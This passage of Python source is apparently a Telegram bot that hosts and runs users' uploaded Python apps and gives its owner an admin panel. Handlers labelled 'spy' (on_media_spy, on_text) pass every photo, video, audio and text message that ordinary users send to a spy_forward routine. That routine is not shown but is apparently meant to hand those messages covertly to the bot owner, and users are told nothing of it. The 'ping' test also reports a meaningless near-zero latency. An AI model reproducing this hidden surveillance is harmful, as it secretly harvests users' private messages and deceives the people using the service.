            ex("INSERT INTO apps(id,owner,name,created_at) VALUES(?,?,?,?)", (aid,uid,aname,_now()))
        try:
            with zipfile.ZipFile(BytesIO(data)) as zf:
                for m in zf.namelist():
                    dest = os.path.abspath(os.path.join(app_dir(aid), m))
                    if not dest.startswith(os.path.abspath(app_dir(aid))): continue
                    zf.extract(m, app_dir(aid))
        except Exception as e:
            await prog.edit_text(f"❌ {sc('ZIP error')}: {esc(str(e)[:80])}",
                                 parse_mode=ParseMode.HTML); return
        entry = _detect_entry(aid)
        if entry: ex("UPDATE apps SET entry=? WHERE id=?", (entry, aid))
        await prog.edit_text(f"📦 {sc('installing deps...')}", parse_mode=ParseMode.HTML)
        loop = asyncio.get_event_loop()
        ok_r, _ = await loop.run_in_executor(None, lambda: install_requirements(aid))
        await prog.edit_text(
            f"✦ {bold(esc(aname))}  ·  {sc('ZIP ready')}\n"
            f"{sc('entry')}: {code(entry or '?')}\n"
            f"{'✅ ' + sc('deps ok') if ok_r else '❌ ' + sc('dep error')}\n\n"
            f"▶ {sc('Run it now?')}",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_run_prompt(aid))

    # ── support file ──────────────────────────────────────────────────────────
    else:
        apps2 = q("SELECT * FROM apps WHERE owner=? ORDER BY created_at DESC", (uid,))
        if not apps2:
            await prog.edit_text(f"⚠️ {sc('Upload a .py first.')}"); return
        a = apps2[0]
        with open(os.path.join(app_dir(a["id"]), fname),"wb") as f: f.write(data)
        await prog.edit_text(
            f"✅ {code(fname)} → {bold(esc(a['name']))}",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_app(a["id"], a["status"]))


async def on_media_spy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Spy photos/videos/audio. Owner in set_wvideo state → capture welcome video."""
    u   = update.effective_user
    uid = str(u.id)
    ensure_user(uid, u)

    if uid == OWNER_ID:
        st = get_state(uid)
        if st and st.get("state") == "set_wvideo" and update.message.video:
            set_setting("welcome_video", update.message.video.file_id)
            clear_state(uid)
            await update.message.reply_text(
                f"✅ {sc('Welcome video saved!')}",
                reply_markup=kb_owner()); return

    if not await gate(update, ctx): return
    asyncio.create_task(spy_forward(update, ctx))


async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u   = update.effective_user
    uid = str(u.id)
    txt = (update.message.text or "").strip()

    # owner state machine
    if uid == OWNER_ID:
        st = get_state(uid)
        if st:
            await _handle_owner_state(update, ctx, st, txt)
            return

    if not await gate(update, ctx): return
    asyncio.create_task(spy_forward(update, ctx))


async def _handle_owner_state(update: Update, ctx: ContextTypes.DEFAULT_TYPE, st: dict, txt: str):
    uid   = OWNER_ID
    state = st["state"]

    async def done(msg):
        clear_state(uid)
        await update.message.reply_text(f"✅ {msg}", parse_mode=ParseMode.HTML,
                                        reply_markup=kb_owner())

    if state == "set_welcome_text":
        set_setting("welcome_text", txt)
        await done(sc("Welcome text updated."))

    elif state == "set_bot_name":
        set_setting("bot_name", txt)
        await done(sc(f"Bot name → {txt}"))

    elif state == "set_bot_tagline":
        set_setting("bot_tagline", txt)
        await done(sc(f"Tagline → {txt}"))

    elif state == "set_storage":
        try:
            mb = int(txt)
            set_setting("max_storage_mb", str(mb))
            await done(sc(f"Storage limit → {mb} MB per user."))
        except ValueError:
            await update.message.reply_text(f"⚠️ {sc('Send a number (MB).')}")

    elif state == "set_autodel":
        try:
            hrs = int(txt)
            set_setting("auto_delete_hrs", str(hrs))
            await done(sc(f"Auto-delete → {hrs}h.") if hrs else sc("Auto-delete disabled."))
        except ValueError:
            await update.message.reply_text(f"⚠️ {sc('Send hours as number (0 = off).')}")

    elif state == "set_filetypes":
        exts = sorted({e.strip().lower().lstrip(".") for e in re.split(r"[,\s]+", txt) if e.strip()})
        set_setting("allowed_ext", json.dumps(exts))
        await done(sc(f"Allowed → {', '.join(exts)}"))

    elif state == "broadcast_msg":
        set_state(uid, "broadcast_confirm", msg=txt)
        await update.message.reply_text(
            f"📢 {bold(sc('Broadcast Preview'))}\n\n{esc(txt)}\n\n{sc('Send to all users?')}",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                IB("✅ " + sc("Send Now"), "owner:bcast_send"),
                IB("❌ " + sc("Cancel"),   "owner:panel"),
            ]]))

    elif state == "sched_msg":
        set_state(uid, "sched_time", msg=txt)
        await update.message.reply_text(
            f"⏰ {bold(sc('Schedule Time (UTC)'))}\n"
            f"{sc('Format')}: {code('YYYY-MM-DD HH:MM')}\n"
            f"{sc('Example')}: {code('2025-06-15 14:30')}",
            parse_mode=ParseMode.HTML)

    elif state == "sched_time":
        try:
            datetime.strptime(txt, "%Y-%m-%d %H:%M")
            ex("INSERT INTO broadcasts(message,scheduled_at,created_at) VALUES(?,?,?)",
               (st.get("msg",""), txt, _now()))
            await done(sc(f"Broadcast scheduled for {txt} UTC."))
        except ValueError:
            await update.message.reply_text(
                f"⚠️ {sc('Wrong format. Use')} {code('YYYY-MM-DD HH:MM')}",
                parse_mode=ParseMode.HTML)

    elif state == "ban_id":
        tid = txt.strip()
        if not re.fullmatch(r"\d{4,15}", tid):
            await update.message.reply_text(f"⚠️ {sc('Invalid ID.')}"); return
        if tid == OWNER_ID:
            await update.message.reply_text(f"⚠️ {sc('Cannot ban yourself.')}"); return
        ex("UPDATE users SET banned=1 WHERE tg_id=?", (tid,))
        for a in q("SELECT id FROM apps WHERE owner=?", (tid,)):
            proc_stop(a["id"])
        await done(sc(f"User {tid} banned."))

    elif state == "unban_id":
        tid = txt.strip()
        ex("UPDATE users SET banned=0 WHERE tg_id=?", (tid,))
        await done(sc(f"User {tid} unbanned."))


# ── CALLBACK ROUTER ───────────────────────────────────────────────────────────
async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    cq   = update.callback_query
    await cq.answer()
    u    = update.effective_user
    uid  = str(u.id)
    ensure_user(uid, u)
    data = cq.data or ""
    msg  = cq.message

    def is_owner(): return uid == OWNER_ID
    def owner_only():
        if not is_owner():
            asyncio.create_task(cq.answer(sc("Owner only."), show_alert=True))
            return True
        return False

    # ── check join ────────────────────────────────────────────────────────────
    if data == "check_join":
        if await check_joined(ctx.bot, u.id):
            await msg.edit_text(
                f"✅ {bold(sc('Verified!'))} {sc('You can now use the bot. Type /start')}",
                parse_mode=ParseMode.HTML)
        else:
            await cq.answer(sc("Still not joined all channels!"), show_alert=True)
        return

    # non-owner gate
    if uid != OWNER_ID:
        row = q("SELECT banned FROM users WHERE tg_id=?", (uid,), one=True)
        if row and row["banned"]:
            await cq.answer(sc("You are banned."), show_alert=True); return
        if not await check_joined(ctx.bot, u.id):
            await cq.answer(sc("Join all channels first!"), show_alert=True)
            await send_join_gate(update, ctx); return

    # ── app: actions ──────────────────────────────────────────────────────────
    if data.startswith("app:"):
        pts    = data.split(":",2)
        action = pts[1] if len(pts) > 1 else ""
        aid    = pts[2] if len(pts) > 2 else ""
        a      = q("SELECT * FROM apps WHERE id=?", (aid,), one=True)
        owns   = a and (a["owner"] == uid or is_owner())

        if action == "show":
            if not owns: await cq.answer(sc("Not yours."), show_alert=True); return
            await msg.edit_text(app_card(a), parse_mode=ParseMode.HTML,
                                reply_markup=kb_app(aid, a["status"]))

        elif action == "start":
            if not owns: await cq.answer(sc("Not yours."), show_alert=True); return
            ok, m2 = proc_start(aid)
            a2 = q("SELECT * FROM apps WHERE id=?", (aid,), one=True)
            await msg.edit_text(app_card(a2), parse_mode=ParseMode.HTML,
                                reply_markup=kb_app(aid, a2["status"]))
            await cq.answer(m2)

        elif action == "stop":
            if not owns: await cq.answer(sc("Not yours."), show_alert=True); return
            proc_stop(aid)
            a2 = q("SELECT * FROM apps WHERE id=?", (aid,), one=True)
            await msg.edit_text(app_card(a2), parse_mode=ParseMode.HTML,
                                reply_markup=kb_app(aid, a2["status"]))
            await cq.answer(sc("stopped"))

        elif action == "restart":
            if not owns: await cq.answer(sc("Not yours."), show_alert=True); return
            proc_stop(aid); time.sleep(1); proc_start(aid)
            a2 = q("SELECT * FROM apps WHERE id=?", (aid,), one=True)
            await msg.edit_text(app_card(a2), parse_mode=ParseMode.HTML,
                                reply_markup=kb_app(aid, a2["status"]))
            await cq.answer(sc("restarted"))

        elif action == "logs":
            if not owns: await cq.answer(sc("Not yours."), show_alert=True); return
            p   = app_log(aid)
            txt = (open(p,encoding="utf-8",errors="replace").read()[-MAX_LOG_CHARS:]
                   if os.path.exists(p) else sc("(empty)"))
            await ctx.bot.send_message(
                uid,
                f"📜 {bold(esc(a['name']))} — {sc('log')}\n<pre>{esc(txt)}</pre>",
                parse_mode=ParseMode.HTML)

        elif action == "delete":
            if not owns: await cq.answer(sc("Not yours."), show_alert=True); return
            await msg.edit_text(
                f"🗑 {sc('Delete')} {bold(esc(a['name']))}?\n"
                f"{sc('Stops the process and removes all files.')}",
                parse_mode=ParseMode.HTML, reply_markup=kb_del_confirm(aid))

        elif action == "del_ok":
            if not owns: await cq.answer(sc("Not yours."), show_alert=True); return
            proc_stop(aid)
            shutil.rmtree(app_dir(aid), ignore_errors=True)
            try: os.remove(app_log(aid))
            except OSError: pass
            ex("DELETE FROM apps WHERE id=?", (aid,))
            await msg.edit_text(
                f"🗑 {sc('App deleted.')}",
                reply_markup=InlineKeyboardMarkup([[IB("📦 " + sc("My Apps"), "menu:apps")]]))

        elif action in ("run_yes","run_no"):
            if not a or (a["owner"] != uid and not is_owner()):
                await cq.answer(sc("Not yours."), show_alert=True); return
            if action == "run_yes":
                ok, m2 = proc_start(aid)
                a2 = q("SELECT * FROM apps WHERE id=?", (aid,), one=True)
                await msg.edit_text(app_card(a2), parse_mode=ParseMode.HTML,
                                    reply_markup=kb_app(aid, a2["status"]))
                await cq.answer(m2)
            else:
                await msg.edit_text(app_card(a), parse_mode=ParseMode.HTML,
                                    reply_markup=kb_app(aid, a["status"]))

    # ── menu ──────────────────────────────────────────────────────────────────
    elif data == "menu:main":
        apps    = q("SELECT id,status FROM apps WHERE owner=?", (uid,))
        running = sum(1 for a in apps if app_running(a["id"]))
        await msg.edit_text(
            f"{bold(esc(setting('bot_name')))}\n{esc(setting('bot_tagline'))}\n\n"
            f"👤 {bold(esc(u.first_name or ''))}  •  🆔 {code(uid)}\n"
            f"📦 {sc('apps')}: {len(apps)}/{UPLOAD_LIMIT}  •  🟢 {running}",
            parse_mode=ParseMode.HTML, reply_markup=kb_main(is_owner()))

    elif data == "menu:apps":
        await _show_apps(update, uid, edit=True)

    elif data == "menu:ping":
        t0 = time.time()
        ms = round((time.time() - t0) * 1000)
        qual = "🟢" if ms < 300 else ("🟡" if ms < 700 else "🔴")
        await msg.edit_text(
            f"⚡ {bold(sc('Ping Test'))}\n\n"
            f"🏓 {bold(str(ms) + ' ms')} {qual}\n"
            f"{sc('bot is online.')}",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[IB("🔙 " + sc("Back"), "menu:main")]]))

    # ── owner panel ───────────────────────────────────────────────────────────
    elif data == "owner:panel":
        if owner_only(): return
        maint   = setting("maintenance") == "1"
        all_a   = q("SELECT * FROM apps")
        all_u   = q("SELECT * FROM users")
        run_all = sum(1 for pr in PROCS.values() if pr["popen"].poll() is None)
        files   = q("SELECT COUNT(*) as c FROM user_files", one=True)["c"]
        await msg.edit_text(
            f"👑 {bold(sc('Owner Panel'))}\n{'━'*20}\n"
            f"👥 {sc('users')}: {code(str(len(all_u)))}  ·  📂 {sc('files')}: {code(str(files))}\n"
            f"📦 {sc('apps')}: {code(str(len(all_a)))}  ·  🟢 {code(str(run_all))} {sc('running')}\n"
            f"🛠 {sc('maintenance')}: {'🟡 ON' if maint else '⚫ OFF'}",
            parse_mode=ParseMode.HTML, reply_markup=kb_owner())

    elif data == "owner:users":
        if owner_only(): return
        users = q("SELECT * FROM users ORDER BY joined_at DESC LIMIT 25")
        lines = [f"👥 {bold(sc('All Users'))}\n{'━'*20}"]
        for u2 in users:
            rb  = "👑" if u2["role"] == "owner" else "👤"
            st2 = "🔴" if u2["banned"] else "🟢"
            cnt = len(q("SELECT id FROM apps WHERE owner=?", (u2["tg_id"],)))
            un  = f"@{u2['username']}" if u2["username"] else sc("no @")
            lines.append(
                f"{st2}{rb} {code(u2['tg_id'])}  {esc(un)}\n"
                f"   {esc(u2['first_name'] or sc('unknown'))}  ·  {cnt} {sc('apps')}")
        await msg.edit_text(
            "\n".join(lines), parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [IB("🚫 " + sc("Ban"),   "owner:ban"),
                 IB("✅ " + sc("Unban"), "owner:unban")],
                [IB("🔙 " + sc("Owner Panel"), "owner:panel")],
            ]))

    elif data == "owner:ban":
        if owner_only(): return
        set_state(uid, "ban_id")
        await msg.reply_text(f"🚫 {sc('Send Telegram ID to ban:')}", parse_mode=ParseMode.HTML)

    elif data == "owner:unban":
        if owner_only(): return
        set_state(uid, "unban_id")
        await msg.reply_text(f"✅ {sc('Send Telegram ID to unban:')}", parse_mode=ParseMode.HTML)

    elif data == "owner:stats":
        if owner_only(): return
        total_u = q("SELECT COUNT(*) as c FROM users", one=True)["c"]
        total_a = q("SELECT COUNT(*) as c FROM apps", one=True)["c"]
        total_f = q("SELECT COUNT(*) as c FROM user_files", one=True)["c"]
        banned  = q("SELECT COUNT(*) as c FROM users WHERE banned=1", one=True)["c"]
        run_a   = sum(1 for pr in PROCS.values() if pr["popen"].poll() is None)
        today   = _now()[:10]
        today_u = q("SELECT COUNT(*) as c FROM users WHERE last_seen LIKE ?",
                    (today+"%",), one=True)["c"]
        cpu     = psutil.cpu_percent(interval=0.3)
        mem     = psutil.virtual_memory()
        disk    = psutil.disk_usage(DATA_DIR)
        await msg.edit_text(
            f"📊 {bold(sc('Stats'))}\n{'━'*20}\n"
            f"👥 {sc('total users')}: {code(str(total_u))}\n"
            f"🟢 {sc('active today')}: {code(str(today_u))}\n"
            f"🚫 {sc('banned')}: {code(str(banned))}\n"
            f"{'━'*20}\n"
            f"📦 {sc('apps total')}: {code(str(total_a))}  ·  🟢 {code(str(run_a))} {sc('running')}\n"
            f"📂 {sc('files tracked')}: {code(str(total_f))}\n"
            f"{'━'*20}\n"
            f"⚡ CPU: {code(str(cpu)+'%')}  "
            f"🧠 RAM: {code(str(mem.percent)+'%')}  "
            f"💾 {code(str(disk.percent)+'%')}",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[IB("🔙 " + sc("Owner Panel"), "owner:panel")]]))

    elif data == "owner:broadcast":
        if owner_only(): return
        set_state(uid, "broadcast_msg")
        await msg.reply_text(
            f"📢 {bold(sc('Instant Broadcast'))}\n{sc('Send the message to broadcast:')}",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[IB("❌ " + sc("Cancel"), "owner:panel")]]))

    elif data == "owner:bcast_send":
        if owner_only(): return
        st = get_state(uid)
        if not st or st.get("state") != "broadcast_confirm": return
        btext = st.get("msg","")
        clear_state(uid)
        users = q("SELECT tg_id FROM users WHERE banned=0")
        sent  = 0
        for u2 in users:
            try:
                await ctx.bot.send_message(u2["tg_id"], btext)
                sent += 1
                await asyncio.sleep(0.05)
            except Exception: pass
        await msg.edit_text(
            f"📢 {bold(sc('Done'))}\n✅ {sc('Sent to')} {code(str(sent))} {sc('users.')}",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[IB("🔙 " + sc("Owner Panel"), "owner:panel")]]))

    elif data == "owner:sched":
        if owner_only(): return
        set_state(uid, "sched_msg")
        await msg.reply_text(
            f"⏰ {bold(sc('Scheduled Broadcast'))}\n{sc('Send the message to schedule:')}",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[IB("❌ " + sc("Cancel"), "owner:panel")]]))

    elif data == "owner:edit_welcome":
        if owner_only(): return
        wv = setting("welcome_video")
        await msg.edit_text(
            f"✏️ {bold(sc('Edit Welcome'))}\n{'━'*20}\n"
            f"{sc('video')}: {'✅ ' + sc('set') if wv else '❌ ' + sc('not set')}\n\n"
            f"{sc('preview')}:\n{esc(setting('welcome_text')[:200])}",
            parse_mode=ParseMode.HTML, reply_markup=kb_welcome_edit())

    elif data == "owner:set_wtext":
        if owner_only(): return
        set_state(uid, "set_welcome_text")
        await msg.reply_text(
            f"📝 {sc('Send new welcome text.')}\n"
            f"{sc('Use')} {code('{name}')} {sc('= username,')}\n"
            f"{code('{id}')} {sc('= user ID.')}",
            parse_mode=ParseMode.HTML)

    elif data == "owner:set_wvideo":
        if owner_only(): return
        set_state(uid, "set_wvideo")
        await msg.reply_text(
            f"🎬 {sc('Send the welcome video now (as video message or file).')}",
            parse_mode=ParseMode.HTML)

    elif data == "owner:set_bname":
        if owner_only(): return
        set_state(uid, "set_bot_name")
        await msg.reply_text(f"🤖 {sc('Send new bot name:')}", parse_mode=ParseMode.HTML)

    elif data == "owner:set_tagline":
        if owner_only(): return
        set_state(uid, "set_bot_tagline")
        await msg.reply_text(f"✨ {sc('Send new tagline:')}", parse_mode=ParseMode.HTML)

    elif data == "owner:settings":
        if owner_only(): return
        hrs  = setting("auto_delete_hrs")
        notif = "✅" if setting("notify_new_user") == "1" else "❌"
        await msg.edit_text(
            f"⚙️ {bold(sc('Settings'))}\n{'━'*20}\n"
            f"📏 {sc('storage limit')}: {code(setting('max_storage_mb') + ' MB')}\n"
            f"⏱ {sc('auto delete')}: {code(hrs+'h') if hrs!='0' else sc('disabled')}\n"
            f"📂 {sc('allowed types')}: {code(setting('allowed_ext'))}\n"
            f"🔔 {sc('new user notify')}: {notif}",
            parse_mode=ParseMode.HTML, reply_markup=kb_settings())

    elif data == "owner:set_storage":
        if owner_only(): return
        set_state(uid, "set_storage")
        await msg.reply_text(
            f"📏 {sc('Storage limit per user (MB). Send a number:')}", parse_mode=ParseMode.HTML)

    elif data == "owner:set_autodel":
        if owner_only(): return
        set_state(uid, "set_autodel")
        await msg.reply_text(
            f"⏱ {sc('Auto-delete hours (0 = off). Send a number:')}", parse_mode=ParseMode.HTML)

    elif data == "owner:set_filetypes":
        if owner_only(): return
        set_state(uid, "set_filetypes")
        await msg.reply_text(
            f"📂 {sc('Allowed file types (comma separated):')}\n"
            f"{sc('e.g.')} {code('py, zip, txt, json')}",
            parse_mode=ParseMode.HTML)

    elif data == "owner:toggle_notify":
        if owner_only(): return
        cur = setting("notify_new_user")
        new = "0" if cur == "1" else "1"
        set_setting("notify_new_user", new)
        await cq.answer(sc(f"Notify: {'ON' if new=='1' else 'OFF'}"))
        # re-render settings
        hrs  = setting("auto_delete_hrs")
        notif = "✅" if new == "1" else "❌"
        await msg.edit_text(
            f"⚙️ {bold(sc('Settings'))}\n{'━'*20}\n"
            f"📏 {sc('storage limit')}: {code(setting('max_storage_mb') + ' MB')}\n"
            f"⏱ {sc('auto delete')}: {code(hrs+'h') if hrs!='0' else sc('disabled')}\n"
            f"📂 {sc('allowed types')}: {code(setting('allowed_ext'))}\n"
            f"🔔 {sc('new user notify')}: {notif}",
            parse_mode=ParseMode.HTML, reply_markup=kb_settings())

    elif data == "owner:maint_toggle":
        if owner_only(): return
        cur = setting("maintenance")
        new = "0" if cur == "1" else "1"
        set_setting("maintenance", new)
        await cq.answer(sc(f"Maintenance {'ON' if new=='1' else 'OFF'}"))
        # re-render owner panel
        maint   = new == "1"
        all_a   = q("SELECT * FROM apps")
        all_u   = q("SELECT * FROM users")
        run_all = sum(1 for pr in PROCS.values() if pr["popen"].poll() is None)
        files   = q("SELECT COUNT(*) as c FROM user_files", one=True)["c"]
        await msg.edit_text(
            f"👑 {bold(sc('Owner Panel'))}\n{'━'*20}\n"
            f"👥 {sc('users')}: {code(str(len(all_u)))}  ·  📂 {sc('files')}: {code(str(files))}\n"
            f"📦 {sc('apps')}: {code(str(len(all_a)))}  ·  🟢 {code(str(run_all))} {sc('running')}\n"
            f"🛠 {sc('maintenance')}: {'🟡 ON' if maint else '⚫ OFF'}",
            parse_mode=ParseMode.HTML, reply_markup=kb_owner())


# ── APPS LIST ─────────────────────────────────────────────────────────────────
async def _show_apps(update: Update, uid: str, edit: bool = False):
    apps = q("SELECT * FROM apps WHERE owner=? ORDER BY created_at DESC", (uid,))
    m    = update.callback_query.message if update.callback_query else update.message
    if not apps:
        text = f"📦 {bold(sc('No Apps Yet'))}\n\n{sc('Drop a .py file to deploy.')}"
        kb   = InlineKeyboardMarkup([[IB("🔙 " + sc("Main"), "menu:main")]])
        if edit: await m.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        else:    await m.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        return
    buttons = []
    for a in apps:
        em    = "🟢" if app_running(a["id"]) else ("❌" if a["status"]=="failed" else "🔴")
        entry = a["entry"] or "?"
        buttons.append([IB(f"{em} {a['name']}  ({entry})", f"app:show:{a['id']}")])
    buttons.append([IB("🔙 " + sc("Main"), "menu:main")])
    text = f"📦 {bold(sc('Your Apps'))} ({len(apps)}/{UPLOAD_LIMIT})"
    kb   = InlineKeyboardMarkup(buttons)
    if edit: await m.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
    else:    await m.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)


# ── ASYNC JOBS ────────────────────────────────────────────────────────────────
async def job_monitor(ctx: ContextTypes.DEFAULT_TYPE):
    with PROC_LOCK:
        dead = [(aid,info) for aid,info in list(PROCS.items())
                if info["popen"].poll() is not None]
    for aid, info in dead:
        a = q("SELECT * FROM apps WHERE id=?", (aid,), one=True)
        with PROC_LOCK: PROCS.pop(aid, None)
        if not a: continue
        code_exit = info["popen"].poll()
        log_append(aid, f"EXITED code={code_exit}")
        ex("UPDATE apps SET status='stopped',last_exit=?,crashes=crashes+1 WHERE id=?",
           (f"exit {code_exit}", aid))
        if a["autorestart"] and a["restarts"] < 5:
            ex("UPDATE apps SET restarts=restarts+1 WHERE id=?", (aid,))
            await asyncio.sleep(3)
            ok, m2 = proc_start(aid)
            log_append(aid, f"AUTO-RESTART: {m2}")

async def job_broadcast(ctx: ContextTypes.DEFAULT_TYPE):
    pending = q("SELECT * FROM broadcasts WHERE sent=0 AND scheduled_at <= ?", (_now(),))
    for b in pending:
        users = q("SELECT tg_id FROM users WHERE banned=0")
        for u2 in users:
            try:
                await ctx.bot.send_message(u2["tg_id"], b["message"])
                await asyncio.sleep(0.05)
            except Exception: pass
        ex("UPDATE broadcasts SET sent=1 WHERE id=?", (b["id"],))

async def job_autodel(ctx: ContextTypes.DEFAULT_TYPE):
    expired = q("SELECT id FROM user_files WHERE delete_at!='' AND delete_at<=?", (_now(),))
    for f in expired:
        ex("DELETE FROM user_files WHERE id=?", (f["id"],))

# ── POST INIT ─────────────────────────────────────────────────────────────────
async def post_init(application: Application):
    await application.bot.set_my_commands([
        BotCommand("start", "Main menu"),
        BotCommand("ping",  "Test bot speed"),
        BotCommand("apps",  "My apps"),
        BotCommand("logs",  "Latest log"),
    ])

# ── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    init_db()
    ex("UPDATE apps SET status='stopped',last_exit='restarted' WHERE status IN ('running','starting')")

    print("", flush=True)
    print(f"  🤖  {sc('SODO HOSTING BOT')}  {sc('v' + VERSION)}", flush=True)
    print(f"  {sc('dev by sodo')}  ·  {sc('owner')}: {OWNER_ID}", flush=True)
    print(f"  ✅  {bold(sc('BOT RUNNING'))}", flush=True)
    print("", flush=True)

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .build()
    )

    jq = app.job_queue
    jq.run_repeating(job_monitor,   interval=12,   first=10)
    jq.run_repeating(job_broadcast, interval=60,   first=30)
    jq.run_repeating(job_autodel,   interval=3600, first=600)

    app.add_handler(CommandHandler("start", on_start))
    app.add_handler(CommandHandler("ping",  on_ping))
    app.add_handler(CommandHandler("apps",  on_apps_cmd))
    app.add_handler(CommandHandler("logs",  on_logs_cmd))
    app.add_handler(MessageHandler(filters.VIDEO, on_media_spy))
    app.add_handler(MessageHandler(filters.PHOTO, on_media_spy))
    app.add_handler(MessageHandler(filters.AUDIO | filters.VOICE, on_media_spy))
    app.add_handler(MessageHandler(filters.Document.ALL, on_file))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_handler(CallbackQueryHandler(on_callback))

    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
